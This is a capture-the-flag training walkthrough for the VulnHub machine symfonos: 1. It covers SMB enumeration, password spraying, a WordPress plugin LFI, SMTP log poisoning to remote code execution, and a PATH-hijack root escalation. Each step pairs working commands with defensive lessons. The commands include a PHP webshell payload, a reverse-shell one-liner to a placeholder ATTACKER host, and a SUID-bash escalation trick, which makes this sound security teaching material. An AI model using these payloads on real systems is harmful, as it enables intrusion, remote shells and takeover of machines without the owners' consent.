# Machine 12 — symfonos: 1

> **Position:** 12 of 13 · **Band 3 — Easy** (global rank **062** of 708)
> **Full writeup:** [`labs/3-062-symfonos-1/README.md`](../../labs/3-062-symfonos-1/README.md)

| | |
| --- | --- |
| **Machine** | symfonos: 1 |
| **Author** | Zayotic |
| **Released** | 29 June 2019 |
| **Target OS** | Debian — Samba 4.5.16, Apache 2.4.25, **Postfix on :25**, WordPress 5.2.2 |
| **VulnHub** | [entry/symfonos-1,322](https://vulnhub.com/entry/symfonos-1,322/) |
| **Estimated time** | 5–8 hours |

---

## How to use this card

Same template: **A** (method + theory) · **B** (the machine) · **C** (every command, logically).
The new theory here: **password spraying**, why a "banned passwords" list is a **weapon**, **LFI → RCE** via a writable file, **SMTP log poisoning**, and **PATH hijacking**.

Read **A** end-to-end *before* you touch the VM — each trick **C** uses is defined there first. Every step reads: **why this step now → the commands → how to read the output → the trap and its defensive lesson**. Answer the pre-lab questions in **B.3** on paper first; they are exactly the knowledge this box demands.

---

# Part A — The method (theory)

## A.1 Password spraying vs brute force

**Spraying** tries a **few** common passwords across **many** accounts; **brute force** tries **many** passwords against **one** account. In plain language: spraying is *one key, many doors*, brute force is *a thousand keys, one lock*. Spraying **defeats lockouts** (one or two attempts per account never reach the threshold) and **passes unnoticed** in the logs — each account just looks like a single failed login. That is why "3 passwords × 2 usernames = 6 attempts" is a realistic attack, not a toy.

## A.2 Why a "banned passwords" list is a **weapon**

An internal memo says: *"the following passwords are now BANNED: epidioko, qwerty, baseball"*. The admin published a list of passwords **in use** — because you ban **what is being used**. It is, functionally, a **ready-made password list**. The right memo would **never** record the passwords, only the **policy** ("at least 14 characters, no dictionary words").

## A.3 LFI → RCE: the crucial "second file"

An LFI reads files. To become **code execution**, you need **a file you can write** that the LFI can include, at a **predictable path**. Here: **the Postfix mailbox** (`/var/mail/helios`), which is **writable** by anyone who sends mail. The usual primitives: mail spools, web logs (`User-Agent` poisoning), session files, `/proc/self/environ`, NFS exports. Ask of every LFI: *which file on this box can **I** cause to be written — and do I know its exact path?*

## A.4 SMTP log poisoning

Postfix **writes your email, verbatim, to a file**. Send PHP in the message (or the `MAIL FROM:`), and it lands in `/var/mail/helios`. Then **include the mailbox via the LFI** — PHP finds the `<?php … ?>` and **executes** it. **LFI + log poisoning = RCE.**

SMTP is a **line-oriented text protocol**: you speak it by hand, one command per line. The reply codes are its grammar: **`220`** greeting, **`250`** success, **`354`** "start sending the body", **`221`** goodbye, and the body ends with a line containing a **single dot**.

## A.5 PATH hijacking

When a privileged program calls a command **without an absolute path** (e.g. `curl` instead of `/usr/bin/curl`), the shell searches `$PATH` **left to right** and runs the **first** match. Put a **directory of your own** first, with an executable of the **same name**, and yours runs — as root.

> **Two rules that kill the whole class.** **Never** let a SUID program resolve commands through `$PATH` (absolute paths, `secure_path`, `env -i`). **Never** leave mail spools, logs or session files includable by a web app.

---

# Part B — The machine

## B.1 What you will learn

1. Enumerate an **anonymous (null) SMB share** and read a leaked internal memo.
2. Why a "banned passwords" list is an **attack asset**, and how to **spray** with it.
3. Enumerate SMB users by **RID/SID** (`enum4linux`).
4. Set up a required **hostname** in `/etc/hosts` (`symfonos.local`).
5. Enumerate WordPress **plugins aggressively** and match them to public exploits.
6. Confirm and exploit **LFI** by reading `/etc/passwd`.
7. Perform **SMTP log poisoning** end to end.
8. Read a **world-readable, unprotected Postfix mailbox**.
9. Escalate via **PATH hijack against a SUID binary that calls `curl` by bare name**.

## B.2 The map

| Stage | Where |
| --- | --- |
| Anonymous SMB leaks a **password policy** | `\\target\anonymous` → **`attention.txt`** |
| Policy list used as a **password list** | banned: `epidioko`, **`qwerty`**, `baseball` |
| Users by SID | `enum4linux -a` → `SYMFONOS\helios` (1000), `SYMFONOS\zeus` (1001) |
| **Spraying** | `smbclient //TARGET/helios -U 'helios%qwerty'` |
| Hidden path | notes → WordPress at **`/h3l105`** |
| Vulnerable plugins | **`mail-masta 1.0`**, `site-editor 1.1.1` |
| **LFI** | `…/mail-masta/inc/campaign/count_of_send.php?pl=` |
| **SMTP log poisoning → RCE** | PHP to `helios` → `/var/mail/helios` → include |
| **SUID with a bare-name command** | `/opt/statuscheck` runs `curl -I http://localhost` |

## B.3 Before you start

- [03 — Service and Network Attacks](../03-Service-and-Network-Attacks.md) **§2** (SMB) and **§3** (SMTP — the log-poisoning payload).
- [02 — Web Attacks](../02-Web-Attacks.md) **§5** (LFI, RCE primitives) and §7 (WordPress plugins).
- [05 — Linux Privilege Escalation](../05-Linux-Privilege-Escalation.md) **§7** (PATH hijacking) — the whole section.

**Answer before:**
1. An internal memo says "these passwords are now BANNED". Why is that a gift to an attacker?
2. What is **password spraying**, and how is it different from brute force?
3. You have an LFI that can read any file. What must be true about a *second* file for RCE?
4. Where does Postfix put a local user's mail, and who can write to it?
5. `/opt/statuscheck` runs `curl -I http://localhost`. Name the vulnerability without looking it up.

---

# Part C — The walkthrough, step by step

Throughout, replace `TARGET` with the target's IP (e.g. `192.168.56.101`).

## Step 1 — Hostname, then a two-stage scan

**Why now.** You know no ports yet, and this WordPress was configured for `symfonos.local` — without that name every later HTTP request looks broken. `echo … | sudo tee -a /etc/hosts` appends (`-a`; never overwrite) to the root-owned hosts file; two names, because the web links use `symfonos.local` while SMTP banners announce `symfonos.localdomain`.

```bash
echo "TARGET symfonos.local symfonos.localdomain" | sudo tee -a /etc/hosts
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports TARGET
sudo nmap -sC -sV -p 22,25,80,139,445 -oA scans/services TARGET
```

```text
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4 (protocol 2.0)
25/tcp  open  smtp        Postfix smtpd
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian
```

**How to read it.** **Port 25 is the seed of the whole box** — SMTP open is not itself a vulnerability, but it means the machine **accepts mail and writes it to a file**, and an LFI can include that file (A.3). `-p-` scans all 65 535 ports; `--min-rate 1000` finishes the sweep in minutes; `-T4` is stable-aggressive; `-oA` keeps `.nmap`/`.xml`/`.gnmap` evidence; the second pass scans only those five ports, deeply: `-sC` default scripts, `-sV` versions — the column that feeds `searchsploit` later.

**Trap & defence.** An unstyled, "broken" page before the hosts entry is normal: WordPress emits absolute `symfonos.local` URLs whose CSS 404s (SBXIO documents this confusion), and `-T5` is worse than `-T4` because it abandons slow replies and reports false negatives. One unauthenticated scan already yielded every port and version — patch, and age your banners.

## Step 2 — SMB: the anonymous share

**Why now.** Samba answers on 139/445, and SMB is the richest **unauthenticated** enumeration target there is: shares, comments, users and policy all leak before a single login. `smbclient` is an FTP-like client; `-L` **lists** shares instead of opening one; `-N` requests a **null session** (no password); inside, `dir` lists and `get <file>` downloads. (`smbmap -H TARGET` is the alternative that prints a permission column per share.)

```bash
smbclient -L //TARGET -N
smbclient //TARGET/anonymous -N
smb: \> dir
smb: \> get attention.txt
```

```text
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
helios          Disk      Helios personal share
anonymous       Disk
IPC$            IPC       IPC Service (Samba 4.5.16-Debian)
```

```text
A word to the wise...
All users are required to change their passwords. The following passwords are now BANNED:
epidioko
qwerty
baseball
```

**How to read it.** Before reading a single file, the **share list already leaks a username**: `helios`, comment *Helios personal share*; `print$` and `IPC$` are stock Samba — ignore them. Then the memo: **read it as an invitation, not a warning** (A.2) — the admin published passwords **in use**. Three candidates, plus one real username from the share name itself.

**Trap & defence.** Beginners file the memo under "defensive notice" and move on; and a null session showing `NO ACCESS` on `helios` is *expected* — only `anonymous` is open, and it is enough. Two misconfigurations did the damage: an anonymous share, and real passwords stored world-readable. Disable guest access everywhere; distribute password **policy**, never password **data**.

## Step 3 — Users by RID, then the obvious password

**Why now.** You hold a 3-word password list; spraying needs usernames. `enum4linux -a` runs *all* tests — users, shares, policy.

```bash
enum4linux -a TARGET
```

```text
S-1-5-21-...-1000 SYMFONOS\helios (Local User)
S-1-5-21-...-1001 SYMFONOS\zeus   (Local User)
```

**How to read it.** The list came from **RID cycling**: Samba identifies accounts by a SID whose trailing number is the **RID** (*relative identifier*); Unix users start at **1000**, so 1000 is the first account and 1001 the second. If an anonymous session may call `SamrLookupRids`, you simply ask *"who is RID 1000? 1001?"* — **no password, no exploit, just a misconfigured permission**. You now have `helios` (also hinted by the share) and `zeus` (the memo's author).

```bash
smbclient //TARGET/helios -U 'helios%qwerty'
smb: \> dir
smb: \> get todo.txt
```

```text
1. vi /etc/hosts to add symfonos.local
2. I'm working on a WordPress site at /h3l105
```

**How to read it.** In `-U 'user%password'` the `%` separates the halves and you must **single-quote the whole argument** — `%` and `!` are meaningful to an unquoted shell. `qwerty` worked straight off the list; six attempts total (2 users × 3 passwords) is **spraying**, not brute force (A.1). `todo.txt` gives `/h3l105` and confirms the hostname; `research.txt` is flavour text about the Greek sun god — a **rabbit hole**, it holds no credentials.

**Trap & defence.** Interactive bash expands `!` inside double quotes, so always single-quote `-U`. Defensively, restrict anonymous/SID enumeration, require SMB signing, and check passwords against breached-password lists: `helios` reused a "banned" password — exactly what banning failed to stop.

## Step 4 — WordPress enumeration

**Why now.** `todo.txt` gave a path; fingerprint what runs there and hunt **known**-vulnerable components — this is where "found a website" becomes "found an exploit". `--plugins-detection aggressive` fingerprints plugins by *requesting their known files* instead of only reading what the HTML references; `-e ap,u` enumerates **all plugins** and **users**; `searchsploit` searches the offline Exploit-DB copy and `-x` **examines** an entry without copying it — read exploits before running them.

```bash
wpscan --url http://symfonos.local/h3l105 --plugins-detection aggressive -e ap,u
searchsploit wordpress mail masta
searchsploit -x php/webapps/40290.txt
```

```text
[+] mail-masta   | Version: 1.0 (100% confidence)
[+] site-editor  | Version: 1.1.1 (80% confidence)
WordPress Plugin Mail Masta 1.0 - Local File Inclusion | php/webapps/40290.txt
```

**How to read it.** `(100% confidence)` means wpscan retrieved the plugin's own `readme.txt`; `(80%)` is fingerprinted from file paths. The rule that matters: plugin name **and** version both match the exploit — the entry is **applicable**, not merely similar. wpscan also lists `admin`, but wordlist attacks on `wp-login.php` are a documented dead end here — do not lose hours there.

**Trap & defence.** SBXIO reports that a normal plugin scan returned **nothing** and only `--plugins-detection aggressive --force` surfaced the plugins — if wpscan says "no plugins", change the detection mode before concluding the site is clean. Defensively, update or **remove** unused plugins (`mail-masta` was long abandoned) and alert on aggressive plugin probing.

## Step 5 — Confirm the LFI

**Why now.** You have a suspect endpoint; prove it before building on it. `curl -s` fetches the URL with the progress meter silenced; `?pl=` is the vulnerable parameter; `/etc/passwd` is the classic proof file — world-readable, so the include succeeds, and free of `<?php` tags, so PHP emits it as literal output.

```bash
curl -s "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
```

```text
root:x:0:0:root:/root:/bin/bash
helios:x:1000:1000:helios,,,:/home/helios:/bin/bash
```

**How to read it.** Fields are `name:password:UID:GID:comment:home:shell`: `root` is UID `0`, `helios` is UID `1000` — independently confirming Step 3. The plugin does `include($_GET['pl']);` — **no filter, no allow-list** — so you can read any file the web user can, **but not yet run code**; here the two halves of the box meet.

**Trap & defence.** Including a **PHP** file *executes* it instead of printing it — which is why `wp-config.php` leaks nothing through this LFI (SBXIO) although a shell can read it; for PHP *source* wrap the path in `php://filter/convert.base64-encode/…` ([02 — Web Attacks](../02-Web-Attacks.md) §5). If the plugin path 404s on your build, mail-masta has a **second** endpoint, `inc/lists/csvexport.php?pl=`. Defensively, never build an `include` path from user input — map an allow-list of fixed keys yourself.

## Step 6 — SMTP log poisoning: LFI → RCE

**Why now.** The LFI only *reads*; port 25 lets you **write**, and Postfix stores delivered mail at a predictable path — the "second file" of A.3. Read the mailbox as-is first (`…?pl=/var/mail/helios`) to confirm the path; some writeups also find it at `/var/spool/mail/helios` (SBXIO). Then speak SMTP by hand (A.4) — type the client lines, the server's replies arrive interleaved:

```text
nc TARGET 25
220 symfonos.localdomain ESMTP Postfix (Debian/GNU)   ← server greets first (220)
EHLO attacker                                          → 250 accepted
MAIL FROM: attacker@kali                               → 250 accepted
RCPT TO: helios                                        → 250 accepted
DATA                                                   → 354 send your body now
<?php system($_GET['c']); ?>                           ← the poison
.                                                      ← single dot ends the body
QUIT                                                   → 250 queued, then 221 bye
```

**How to read it.** The reply codes are the grammar: `220` greeting, `250` success, `354` "body now", `221` goodbye — and the lone `.` is the **end-of-data marker, not part of the message**. `250 2.0.0 Ok: queued` is the receipt: Postfix will write it to `/var/mail/helios`. Now trigger it:

```bash
nc -lvnp 4444                                            # Kali, first
curl -s "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=id"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**How to read it.** **LFI + log poisoning = RCE**: the include pulls in the mailbox, PHP finds the `<?php … ?>` we mailed in and executes it, `&c=` supplies the command for `system()`. `uid=33` is `www-data`, Debian's web account (UID 33 assigned at install).

**Trap & defence.** Hacking Articles' commenters report mail that "queues but nothing happens" — usual causes: no single-dot line, a `RCPT TO` that is not a local user, or a payload that never reached the body; SBXIO confirms the recipient with `VRFY helios` and needed `sendEmail … -o tls=no` because Postfix advertises STARTTLS (manual `nc` avoids that), while crazyeights225 injects the PHP in `MAIL FROM:`. Defensively, bind Postfix to localhost, keep `/var/mail/*` non-includable, alert on `<?php` in SMTP.

## Step 7 — Reverse shell and TTY upgrade

**Why now.** `&c=id` is command-at-a-time over HTTP; a shell is an interactive session — and a **reverse** shell, because inbound connections to your target are usually filtered while outbound ones are not. Start the listener **first**; `-l` listen, `-v` verbose, `-n` no DNS, `-p` port (use one above 1024 so you do not need root):

```bash
nc -lvnp 4444
```

```bash
curl -s "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=$(python3 -c "import urllib.parse as u;print(u.quote('bash -i >& /dev/tcp/ATTACKER/4444 0>&1'))")"
```

**How to read it.** **URL-encoding is mandatory** — `&` separates query parameters and `>` is reserved, so an unencoded payload is mangled before PHP sees it; `urllib.parse.quote` fixes that. In the payload, `>&` sends stdout **and** stderr to the socket and `0>&1` sends stdin there too — that pair makes the shell *interactive*. Alternatives confirmed in writeups: `nc -e /bin/sh` (crazyeights225, Hacking Articles) and `bash -c 'bash -i >& /dev/tcp/…'` (rudefish, SBXIO). Upgrade the TTY at once, or `Ctrl+C` kills your *listener* and `sudo`/`vim` refuse to run:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'   # target
# Ctrl+Z (suspends the job on Kali), then on Kali:  stty raw -echo; fg
export TERM=xterm                                  # target
```

**Trap & defence.** Triggering before the listener is up gives a refused connection and burns the attempt; `/dev/tcp` is a **bash** feature — if it dies silently, try the `nc`/`python` variant. Defensively, egress filtering and alerts on outbound shells from `www-data` stop this step outright.

## Step 8 — The SUID hunt finds a custom binary

**Why now.** You are low-privileged; escalation starts with the cheapest question — *what may I already run with someone else's privileges?* `find / -perm -u=s -type f` finds **regular files with the SUID bit** (`2>/dev/null` discards the thousands of `Permission denied` lines that would bury the answer); `strings` extracts printable ASCII from a compiled binary, so you can read its hidden text without decompiling.

```bash
find / -perm -u=s -type f 2>/dev/null
ls -l /opt/statuscheck
strings /opt/statuscheck | grep -iE 'curl|/bin|/usr'
```

```text
/opt/statuscheck
-rwsr-xr-x 1 root root 8632 Jun 29  2019 /opt/statuscheck
curl -I http://localhost
```

**How to read it.** Everything else (`passwd`, `su`, `mount`, `ping`, `ssh-keysign`, …) is **stock Debian** — compare against that baseline and the odd entry jumps out: a custom program in `/opt`. In `-rwsr-xr-x` the **`s` sits where the owner-execute bit would be** and the owner is `root`, so it runs as root for anyone. The money line is `curl -I http://localhost`: **`curl` with no leading `/`** is the vulnerability, and `strings` also shows the binary imports `system()` (crazyeights225).

**Trap & defence.** `/opt/statuscheck` is **not** in GTFOBins (SBXIO) because it is custom — no ready recipe, you must read it yourself — and never skip `sudo -l`. Defensively: absolute paths in privileged programs, and strip SUID from anything that does not need it.

## Step 9 — The PATH hijack

**Why now.** `statuscheck` runs as root and resolves `curl` through `$PATH`; you control `$PATH` for the process you start, so you control what root executes.

```bash
cd /tmp
printf '/bin/sh -p\n' > curl
chmod +x curl
export PATH=/tmp:$PATH
/opt/statuscheck
id
cat /root/proof.txt
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

**How to read it.** `cd /tmp` — a world-writable directory always open to you. `printf … > curl` writes a script named **exactly like the command the binary calls** (`printf`, not `echo`, reliably emits the trailing newline); `chmod +x` makes it executable — without it root gets "Permission denied" and you wrongly conclude the hijack is impossible; `export PATH=/tmp:$PATH` **prepends** `/tmp` so *your* `curl` is found first (appending would leave `/usr/bin/curl` ahead — and silently do nothing). The prompt turns to `#` and `id` prints **`uid=0(root)`**; `cat /root/proof.txt` is the flag.

**Trap & defence.** The three classic failures, in order: appended-not-prepended PATH, missing `chmod +x`, and forgetting `-p` — without it `sh` drops the inherited effective UID as a safety measure, you get `$` instead of root, and you assume the attack failed. Restore afterwards: `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`, delete `/tmp/curl`. Other payloads that work: a SUID copy of bash (`cp /bin/bash /tmp/rootbash && chmod u+s …`), or a compiled C `setuid(0)` program — gcc is on the box (rudefish, SBXIO); some writeups get `euid=0` from a plain `/bin/sh` (crazyeights225), so `-p` is the variant that never depends on the shell.

---

# Part D — Defensive lessons

| Finding | Fix |
| --- | --- |
| **Anonymous SMB share** | Disable guest/anonymous on every share; audit shares quarterly |
| Memo listing banned passwords | A banned list is a **hint list**. Distribute policy only through authenticated channels |
| `helios : qwerty` | Enforce complexity/length; check against a breached-password list; lockout and rate limiting |
| SMB users enumerable by SID | Require SMB signing; restrict anonymous enumeration |
| **`mail-masta 1.0` / `site-editor 1.1.1` LFI** | Update or **remove** unused plugins; block plugin paths at the WAF as a stopgap |
| `pl=` reaching `include()` | Never build an include path from user input — use an allow-list of fixed keys |
| Hidden WordPress path `/h3l105` | Obscurity is not a control |
| **Unprotected Postfix mailbox** | Restrict `/var/mail/*` permissions; disable the mailbox if unused |
| SMTP open to the network | Bind Postfix to localhost or firewall port 25 |
| **SUID `/opt/statuscheck` calling `curl` by bare name** | **Absolute paths** in privileged programs; `secure_path`; remove SUID if not required |

**The single biggest lesson:** *an LFI plus any writable file equals remote code execution.* Mail spools, web logs, auth logs, session files, `/tmp` — the list of writable-and-includable files is long, and defenders routinely forget it.

---

# Part E — Review questions

1. Name the **three** independent weaknesses that had to combine for the RCE. Would any one alone have given a shell?
2. Why is a "banned passwords" memo an attack asset rather than a defensive control? What should the memo have said instead?
3. You sprayed 2 usernames × 3 passwords = 6 attempts. How does that compare to brute force in detectability?
4. Besides the mail spool, name **three other files** an LFI could include to achieve RCE.
5. Why did the poisoned mail execute as PHP when Postfix stored it as plain text?
6. `strings /opt/statuscheck` revealed the bug in seconds. What else should you always run `strings` on?
7. Would this PATH hijack have worked if `sudo -l` had shown a `secure_path`? Explain.
8. The WordPress install was at `/h3l105`, not `/`. Did the obscure path add security? Why not?

---

# Part F — Hints ladder

<details>
<summary><strong>Rung 1 — a nudge</strong></summary>

Ports **22, 25, 80, 139, 445**. Port **25** (SMTP) is unusual on a beginner box — note it. Start with
SMB: try **anonymous** access to **every** share. And the site will want a **hostname**.
</details>

<details>
<summary><strong>Rung 2 — the memo and the share</strong></summary>

`smbclient //TARGET/anonymous -N` → `attention.txt` → banned: `epidioko`, **`qwerty`**, `baseball`.
`enum4linux -a` → `helios`, `zeus`. Spray: `smbclient //TARGET/helios -U 'helios%qwerty'` → notes →
**`/h3l105`**. `/etc/hosts` → `symfonos.local`.
</details>

<details>
<summary><strong>Rung 3 — the LFI</strong></summary>

`wpscan … --plugins-detection aggressive -e ap,u` → **`mail-masta 1.0`**.
`curl "…/count_of_send.php?pl=/etc/passwd"` → you can read anything. Then: *which file can I
**write**?* Port 25 is Postfix → `/var/mail/<user>`.
</details>

<details>
<summary><strong>Rung 4 — SMTP log poisoning</strong></summary>

Mail `<?php system($_GET['c']); ?>` to `helios` via SMTP → lands in `/var/mail/helios` → include with
`?pl=/var/mail/helios&c=id` → **RCE**. Then a reverse shell. Root: `/opt/statuscheck` (SUID) runs
`curl` with a bare name → `/tmp/curl` + `export PATH=/tmp:$PATH` → root.
</details>

<details>
<summary><strong>Rung 5 — the answer</strong></summary>

1. `nmap -p-` → **22, 25, 80, 139, 445**. 2. anonymous → `attention.txt` (password list).
3. `enum4linux` → `helios`, `zeus`. 4. `helios:qwerty` → notes → **`/h3l105`**. 5. `wpscan` →
**`mail-masta 1.0`**. 6. LFI `?pl=/etc/passwd`. 7. **SMTP poisoning** → `/var/mail/helios` → RCE.
8. **SUID `/opt/statuscheck`** → PATH hijack → root → `/root/proof.txt`.
</details>

---

# Part G — References

- **VulnHub entry:** <https://vulnhub.com/entry/symfonos-1,322/>
- **English lab:** [`labs/3-062-symfonos-1/README.md`](../../labs/3-062-symfonos-1/README.md)
- **Greek mirror of this card:** [`Μηχανές/12-symfonos-1.md`](../../Μαθησιακή%20Διαδρομή%201%20-%20Εισαγωγή%20στην%20Κυβερνοασφάλεια/Μηχανές/12-symfonos-1.md)
- **Cross-checked writeups** (confirm `attention.txt`, `helios:qwerty`, mail-masta LFI, statuscheck):
  - [crazyeights225 — symfonos1](https://crazyeights225.github.io/symfonos1/)
  - [hackmd (rudefish) — Symfonos: 1](https://hackmd.io/@rudefish/vulnhub-symfonos-series-symfonos1-walkthrough)
  - [news4hackers — symfonos:1](https://www.news4hackers.com/symfonos-1-vuln-hub-machine-walkthrough/)
  - [Exploit-DB 40290 — Mail Masta LFI](https://www.exploit-db.com/exploits/40290)

- **Community notes — consensus, pitfalls and alternative routes** (cross-checked against the sources below):
  - **Consensus chain:** `nmap -p-` → `22/25/80/139/445` → `/etc/hosts symfonos.local` → anonymous SMB `anonymous` → `attention.txt` password list → `enum4linux` → user `helios` → `smbclient //TARGET/helios -U 'helios%qwerty'` → `todo.txt` → WordPress at `/h3l105` → `wpscan --plugins-detection aggressive` → `mail-masta 1.0` LFI (EDB 40290) → SMTP log poisoning to `/var/mail/helios` → `?pl=/var/mail/helios&c=id` RCE → SUID `/opt/statuscheck` PATH hijack → root.
  - **Common pitfall:** the site misbehaves without the `symfonos.local` hostname in `/etc/hosts`; and the LFI only prints a file if it contains no `<?php` (so `/etc/passwd` works, PHP source does not).
  - **Common pitfall:** SMTP is spoken by hand — end the `DATA` body with a single `.` line and use `RCPT TO: helios@symfonos.localdomain`; some builds get RCE as `helios` rather than `www-data`.
  - **Common pitfall:** remember `-p-` and port 25; the path hijack needs `export PATH=/tmp:$PATH` (prepend) and `-p` in the payload, else you get `$` instead of `#`.
  - **Alternative route:** the second plugin `site-editor 1.1.1` is also an LFI (EDB 44340); `research.txt` is a rabbit hole — `todo.txt` holds the real `/h3l105` hint.
  - **Alternative routes (SBXIO, rudefish):** enumerate port 25 users with `smtp-user-enum -M VRFY` (returns `helios`); mail-masta's second LFI endpoint `inc/lists/csvexport.php?pl=`; if `/var/mail/helios` is empty try `/var/spool/mail/helios`; deliver the payload with `sendEmail … -o tls=no`; after the shell, `/var/www/html/h3l105/wp-config.php` holds `wordpress:password123`; gcc is present, so a compiled `setuid(0)` PATH payload is an option.
  - **⚠️ Verification note:** exact file wording varies by build. Our lab's `attention.txt` reads "A word to the wise… the following passwords are now BANNED", while crazyeights225's build shows a note signed **"-Zeus"** ("stop using passwords like 'epidioko', 'qwerty' and 'baseball'"). The three passwords are consistent across all sources — the signature is a bonus username, not a contradiction.
  - **⚠️ Verification note:** `todo.txt` wording also varies; some writeups show "Binge watch Dexter / Dance / Work on /h3l105". The only fact that matters — and it is consistent everywhere — is the path **`/h3l105`**.
  - **⚠️ Verification note:** the RCE user is `www-data` (UID 33) in our lab and in Hacking Articles' screenshots, but crazyeights225's build reports `helios` (UID 1000) for the same payload. Both are footholds; the SUID step is unchanged.
  - **Verified sources:** [crazyeights225](https://crazyeights225.github.io/symfonos1/) · [Hacking Articles](https://www.hackingarticles.in/symfonos1-vulnhub-walkthrough/) · [news4hackers](https://www.news4hackers.com/symfonos-1-vuln-hub-machine-walkthrough/) · [SBXIO](https://www.sbxio.com/vulnhub-symfonos-1)

---

# Part H — If you get completely stuck

- Verify connectivity: `ping TARGET`, `ip -br a`.
- **First** the hostname `symfonos.local` — otherwise the web does not behave.
- If the RCE gives no output, check that the mail actually arrived (`?pl=/var/mail/helios`).
- Mail "queued" but no code execution? Re-check the single-dot line and `RCPT TO: helios`.
- wpscan reports no plugins? Add `--force` alongside `--plugins-detection aggressive`.
- Check [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and [`docs/TOOLS.md`](../../docs/TOOLS.md).
- Revert the snapshot and redo from memory.

---

_Back to [Learning Path 1](../README.md) · previous: [Machine 11 — Photographer: 1](11-photographer-1.md) · next: [Machine 13 — HackInOS: 1](13-hackinos-1.md) · full writeup: [`labs/3-062-symfonos-1`](../../labs/3-062-symfonos-1/README.md)._
